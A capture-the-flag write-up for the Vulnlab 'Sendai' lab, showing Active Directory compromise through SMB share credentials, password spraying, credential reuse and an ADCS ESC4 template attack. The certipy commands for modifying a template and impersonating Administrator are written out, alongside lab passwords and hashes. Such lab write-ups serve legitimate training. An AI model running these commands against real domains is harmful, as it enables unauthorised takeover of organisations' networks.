# Sendai — Vulnlab (write-up)

**Difficulty:** Medium
**Box:** Sendai (Vulnlab)
**Author:** dsec
**Date:** 2025-03-20

---

## TL;DR

### Enumerated SMB shares and found creds. Pivoted through multiple users via password spraying and PrivescCheck. `clifford.davey` in the CA-Operators group had full control over the `SendaiComputer` certificate template (ESC4), which was modified to impersonate Administrator.
---
## Target info

- Host: `10.10.72.38`
- Domain: `sendai.vl` / `dc.sendai.vl`
---
## Enumeration

![Nmap results](images/sendai-vl_1.png)

![Service details](images/sendai-vl_2.png)

![Additional enumeration](images/sendai-vl_3.png)

![SMB enumeration](images/sendai-vl_4.png)

![Share listing](images/sendai-vl_5.png)

![User enumeration](images/sendai-vl_6.png)

![More enumeration](images/sendai-vl_7.png)

![Password spray](images/sendai-vl_8.png)

![Results](images/sendai-vl_9.png)

---
## Foothold

Accessed the Sendai share:

![Sendai share](images/sendai-vl_10.png)

![Share contents](images/sendai-vl_11.png)

![File details](images/sendai-vl_12.png)

![Credentials found](images/sendai-vl_13.png)

Same privileges as:

![Privilege check](images/sendai-vl_14.png)

![WinRM access](images/sendai-vl_15.png)

---
## Lateral movement

![Hash extraction](images/sendai-vl_16.png)

Hash: `edac7f05cded0b410232b7466ec47d6f`

![Cracked hash](images/sendai-vl_17.png)

![Credential reuse](images/sendai-vl_18.png)

Found: `sqlsvc:SurenessBlob85`

Ran PrivescCheck:

![PrivescCheck results](images/sendai-vl_19.png)

![More privesc info](images/sendai-vl_20.png)

Found: `clifford.davey:RFmoB2WplgE_3p`

![Group membership](images/sendai-vl_21.png)

`clifford.davey` belongs to the CA-Operators group.

---
## Privesc

Enumerated certificate templates with certipy:

```bash
certipy find -u clifford.davey -vulnerable -target dc.sendai.vl -dc-ip 10.10.72.38 -stdout
```

![Certipy results](images/sendai-vl_22.png)

![Template details](images/sendai-vl_23.png)

Found `SendaiComputer` template with Client Authentication EKU. CA-Operators group has Full Control -- ESC4 (access control abuse).

Wrote default configuration to make the template enrollable by domain users:

```bash
certipy template -u 'clifford.davey' -target dc.sendai.vl -dc-ip 10.10.72.38 -template 'SendaiComputer' -write-default-configuration -force
```

![Template modification](images/sendai-vl_24.png)

Verified the change:

```bash
certipy find -u clifford.davey -vulnerable -target dc.sendai.vl -dc-ip 10.10.72.38 -stdout
```

![Verification](images/sendai-vl_25.png)

Requested a certificate as Administrator:

```bash
certipy req -u 'clifford.davey' -ca 'sendai-DC-CA' -target dc.sendai.vl -dc-ip 10.10.72.38 -template 'SendaiComputer' -upn 'administrator@sendai.vl' -dns 'whatever.sendai.vl' -key-size 4096 -out admin
```

Authenticated:

```bash
certipy auth -pfx admin.pfx -dc-ip 10.10.72.38
```

![Administrator hash](images/sendai-vl_26.png)

Got hash: `aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a`

---
## Lessons & takeaways

- PrivescCheck is valuable for finding stored credentials and misconfigurations on Windows hosts
- Certificate template access control (ESC4) is exploitable when a group has Full Control over a template
- Chain multiple credential pivots -- each user may unlock new groups and permissions
- CA-Operators group membership is a strong indicator of ADCS attack potential
---
